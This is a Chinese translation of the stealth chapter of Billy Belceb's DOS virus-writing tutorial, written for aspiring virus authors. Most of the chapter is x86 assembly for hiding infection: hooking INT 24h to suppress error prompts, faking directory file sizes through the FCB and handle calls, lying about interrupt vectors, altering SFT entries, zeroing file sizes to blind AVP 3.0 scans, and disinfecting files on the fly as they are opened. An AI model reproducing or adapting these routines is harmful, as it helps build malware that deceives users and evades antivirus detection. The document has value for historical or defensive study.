
# Billy Belceb 病毒编写教程---DOS 篇

> 原文：[`www.pediy.com/kssd/pediy06/pediy64067.htm`](https://www.pediy.com/kssd/pediy06/pediy64067.htm)

## 隐蔽(Stealth)

什么是隐蔽？在病毒编写世界里，是指所有这些技术，使得我们隐藏病毒的感染特征，如文件大小的增长，我们执行一个程序去些一个写保护了的软盘的错误信息"Abort,Retry,Ignore",读一个消了毒的文件，文件的日期看起来没什么问题...换句话说，使用户相信一些假的东西。隐蔽还是一个病毒组织的名字(SGWW)，但这是另外一段历史了:)

### INT 24h 隐蔽

是的，这是一种隐蔽的方法。你可以认为它太老了，但是我相信这是在病毒里实现隐蔽的第一步。目标是在我们正在执行一个写保护了的软盘上的程序，使得病毒企图写，并且它做了，但是 DOS 发现了这个错误，要避免出现"Abort,Retry,Ignore"这个错误提示信息。如果使用者看到了这个信息，将会怀疑有些问题...

这非常简单，所有我们要做的就是取代原先的 `INT 24h` 中断向量(这个中断处理严重的错误)来欺骗这个中断，代码仅仅为"mov al,3"，后面跟着一个"iret"。

让我们看看：

```
mov  ax,3524h
int  21h
mov  word ptr [int24_off],bx
mov  word ptr [int24_seg],es
mov  ax,2524h
lea  dx,int24handler
int  21h
[...]
int24handler:
mov  al,3
iret
```

### 目录隐蔽

有两种类型的目录隐蔽：通过 FCB 和通过句柄。

**FCB 隐蔽：**

你还记得 FCB 的结构吗？你可以看看结构这一章，如果你已经忘了:)

好了，让我们来看看...这里我们的目标是把病毒大小减去真正的感染的病毒的大小，你必须添加如下的代码到你的 `int 21h` 的处理：

```
[...]
cmp  ah,11h      ; FindFirst ( FCB )
je   FCBstealth
cmp  ah,12h      ; FindNext ( FCB )
je   FCBstealth
[...]
```

然后我们创建一个过程叫 `FCBstealth` (你也可以命名为其它的)，让后放进一个假的中断调用。然后我们经常结果是否为 0，如果为 0，我们直接跳到中断返回处，否则，我们继续。现在我们把我们使用的寄存器(AX,BX,ES)压栈，然后我们调用 `INT 21h` 功能 `Ah=2Fh`，把 DTA 的地址返回到 `ES:BX` 中。现在该是检测 FCB 是普通的还是扩展的时候了。通把 FCB 的第一个字节(在 `ES:[BX]` 中)和 `FFh` 比较，我们就知道了。如果相等，则 FCB 是扩展的，然后我们通过对 `BX` 加 7 个字节来修正它。如果它是普通的，我们保留它。现在我们经常这个文件是否已经被感染过。为了使我们的问题最简单，我将假设感染的标志是使秒数达到 60 (一个不可能的值)。如果它没被感染，我们跳过这个文件。现在该是减去病毒大小的时候了，和...这里我们有!FCB 隐蔽!让我们看看代码：

```
FCB_Stealth:
pushf
call dword ptr cs:[oldint21] ; Fake call to INT 21h
or al,al      ; Optimized cmp al,0
jnz  error
push ax bx es
mov  ah,2Fh    ; Get DTA address in ES:BX
int  21h
cmp  byte ptr es:[bx],0FFh ; Is FCB extended ?
jne  normal
add  bx,07h     ; No, fix it
normal:
mov  ax,es:[bx+17h]   ; Get seconds
and  ax,1Fh      ; Unmask seconds
xor  al,1Eh      ; Are seconds = 60 ? ( 30*2 )
jne  not_infected    ; No, skip it
sub  word ptr es:[bx+1Dh],virus_size ; Substract virus size
sbb  word ptr es:[bx+1Fh],0 ; With borrow, too
not_infected:
pop  es bx ax
error:
retf  02
```

**句柄隐蔽：**

句柄是达到 FCB 隐蔽目的的另外一种方法。我们的目标也一样，隐藏大小 (还有其它如果需要的话)...但是这个功能我们必须阻止，而我们必须改变的东西也有一点不一样 (如果一样我们就使用和上面一样的代码了)

好了，我提供给你的 `INT 21h` 的处理代码如下：

```
[...]
cmp  ah,4Eh      ; FindFirst ( Handle )
je   HandleStealth
cmp  ah,4Fh      ; FindNext ( Handle )
je   HandleStealth
[...]
```

现在，我将解释一个经典的处理隐蔽的例程。首先，我们编写一个调用旧 `INT 21h` 的假调用函数 (当然要在把标志压栈后啦)。接下来，我们把要保存的寄存器保存了 (AX,BX,ES) 并获得 `ES:BX` (AH=2Fh) 里的 DTA。我们检查是否已被感染 (在 `ES:[BX+17h]` 处)，如果已经被感染，我们就把文件的大小减去病毒的大小。它和上面的隐蔽的方法很类似，但是，正如你看到的，还有一些不同的东西。:)

光有理论没有代码太无聊了:)

```
HandleStealth:
pushf
call dword ptr cs:[oldint21] ; Fake call to DOS API
jc   goback      ; CF=1 if error
push ax bx es    ; Save registers we use
mov  ah,2Fh      ; DTA @ ES:BX
int  21h
mov  ax,es:[bx+16h]   ; Get the file time
and  ax,1Fh      ; Unmask Seconds
xor  al,1Eh      ; 60 ? ( Compare in optimized way )
jne  damnedpops    ; Fuck!
sub  word ptr es:[bx+1Ah],virus_size ; Guess...
sbb  word ptr es:[bx+1Ch],0
damnedpops:
pop  es bx ax    ; Get the old values
goback:
retf  02
```

#### 目录隐藏里的问题

还有一些问题需要改正，为了避免使用户痛苦，我们需要检查是否有一些问题：

- 压缩工具，如 `PKZIP`, `RAR`, `ARJ`, `LHA`, `AIN`, 等等。因为如果我们给它们一个不正确的大小，那它们在压缩文件的时候将会崩溃 : (
- 辅助工具如 `CHKDSK`，将会不停地显示一个永不停止的错误列表，因为硬盘上文件的大小和我们显示给用户看的大小不相等 : (
- 病毒查杀工具如 `F-PROT`, `AVP` 和其它的 SCUM，会保护显示可能被一个隐蔽的病毒感染的信息。

所以，浪费一些代码来做比较为了看看这些程序中是否有一个正在运行，然后释放隐蔽并不是一个坏主意 (当我们脱离危险之后，再激活)。

### 中断向量隐蔽

这种类型的隐蔽非常容易。当我们使用这种方法的时候，我们试图获得原先的向量 (在安装我们自己的中断处理程序的时候需要得到它们) 给请求调用的程序。对于有些事情有好处：我们的中断处理程序将总是在第一位的。让我们看看如果我们钩住了上述的中断，我们需要添加什么给 `INT 21h` 的向量呢。

```
[...]
cmp  ax,3521h    ; Get INT 21h vectors
je   RequestINT21h
cmp  ah,2521h    ; Put INT 21h vectors
je   PutNewINT21h
[...]
```

添加我们如下的例程：

```
RequestINT21h:
mov  bx,word ptr cs:[int21_off] ; Return in BX the old int offset
mov  es,word ptr cs:[int21_seg] ; Return in ES the old int segment
iret

PutNewINT21h:
mov  word ptr cs:[int21_seg],ds ; Put the new segment in int21_seg
mov  word ptr cs:[int21_off],dx ;  "   "   "  offset  "  int21_off
iret
```

### 时间隐蔽

这里我不能列出代码了因为这个是属于私人的东西，当你编写你的病毒的时候，它必须适合你的需要。你可以使用很多的方法来标志感染的文件...把秒设置到 60, 62... (不可能)，使年增加 100 年，使秒和日期相等...获得时间和日期的方法使使用功能 `AX=5700h`，并赋新值 `AX=5701h`。将在 `CX` 中得到时间，在 `DX` 中得到日期 (这些我们必须要中途改变以实现隐蔽的)。

### SFT 隐蔽

如果你还记得 SFT 这个结构，在偏移地址 11 处，我们有一个双字用来保存文件的大小，那么所有我们需要做的使看这个文件是否已被感染，如果已经感染了，把文件的大小减去病毒的大小。让我们看一小段代码 (假设感染的标志是 seconds=60, 并且我们已经调用了一个例程使得 SFT 在 `ES:DI` 中)：

```
Infect:
[...]
mov  ax,word ptr es:[di+0Dh] ; Get time
and  al,01Fh     ; Unmask seconds
cmp  al,01Eh     ; Seconds = 60 ?
jnz  AintInfected    ; No, infect it
sub  word ptr es:[di+11h],virus_size ; Yes, substract virus size
sbb  word ptr es:[di+13h],0000h
[...]
AintInfected:
[...]
```

你能做的一件比较好的事情是避免 `AVP 3.0` 的扫描。首先，我们必须知道 `AVP` 是否正在运行。当 `AVP 3.0` 打开一个文件，有许多值使得我们知道它正在运行着呢 (`BX=5`, `SI=402Dh`)。现在该是获得 SFT 的时候了，然后仅用两行代码，对于 Kaspersky's son，使所有的文件大小为 0：

```
mov  word ptr es:[di+11h],0000h
mov  word ptr es:[di+13h],0000h
```

或者只使一个如果我们能够 : )

```
mov  dword ptr es:[di+11],00000000h
```

### 在空中消毒

这里我还是不能给你一些代码。它必须由你来编...但是我可以给你 `INT 21h` 的代码：

```
[...]
cmp  ah,03Dh     ; Open file
jz   Disinfect
cmp  ax,6C00h    ; Extended open
jz   Disinfect
cmp  ah,03Eh     ; Close file ( infect now!!! )
jz   Infect
[...]
```

现在，我们必须注意一件事情...我们必须修改一些东西来编写 `AH=3Dh` 和 `AX=6C00h` 的相同例程。

1. 文件名在 `Ah=3Dh` 时的 `DS:DX` 处，在 `AX=6C00h` 时的 `DS:SI` 处。
2. 打开模式在 `AH=3Dh` 时的 `AL` 中，在 `AX=6C00h` 时的 `BL` 中。

所以，我们需要编写一个例程来修改访问 `6C00h` 功能。它可能应该这样：

```
Disinfect:
cmp  ax,6C00h
jne  Check
cmp  dx,1
jne  ExitDisinfection
mov  al,bl      ; Open mode in AL
mov  dx,si      ; File name is now in DS:DX
Check:
mov  ax,5700h
int  21h       ; If we've hooked this function,
               ; we need to make a fake call! ( or
               ; use SFTs! )
and  cl,1Fh      ; Unmask seconds
or   cl,1Eh      ; Is it 60?
jnz  NotInfected
[...]
```

消毒是你必须要做的一个例程。它没有 FCB 隐蔽那么普遍，因为在 FCB 隐蔽中你有很多选择。OK，我至少应该解释它是怎么工作的。

**给 COM 文件消毒：**

给 COM 文件消毒很简单。我们需要恢复原先感染改变的第一个字节 (通常 3 个字节)，恢复原先文件的时间/日期，移除病毒的主体 (在"文件尾-病毒大小"偏移地址处改为文件结束)。

**给 EXE 文件消毒：**

这实现起来稍微有一点点难，但不难理解 :)

我们需要恢复原先的文件头，恢复时间/日期和移除文件末尾处的病毒主体。但是如果我们的病毒是经过加密的话就有问题了。你必须选择要不这几个字节不加密 (就给了病毒查杀工具杀毒的方法了 <g>) 要不就给这些字节解密。无论如何，它还是比较简单的。

### 关于隐蔽的最后讨论

还有更多的隐蔽的方法，如 4202 隐蔽，扇区隐蔽...但是我已经解释了最简单最常用的方法。BTW，如果我们使用 SFT 隐蔽，那我们就不需要 4202 隐蔽了 :)

在某些类型的隐蔽方法中，最可怕的事情就是和某些软件不兼容，那样可能会适得其反。

读到这里，你可能要问了："隐蔽有用吗？"答案是一个大大的 YES。这个是把病毒的感染隐藏的最好的方法：文件看起来大小没有变化，病毒查杀工具不会查到任何有用的信息 (使用一个十六进制编辑器来查看蛛丝马迹同样只是浪费时间罢了)，还有更多的好处。你能做的最好的事情就是当诸如 `CHKDSK`, `PKZIP` 之类的程序运行时释放隐蔽。所有这些只是举手之劳。
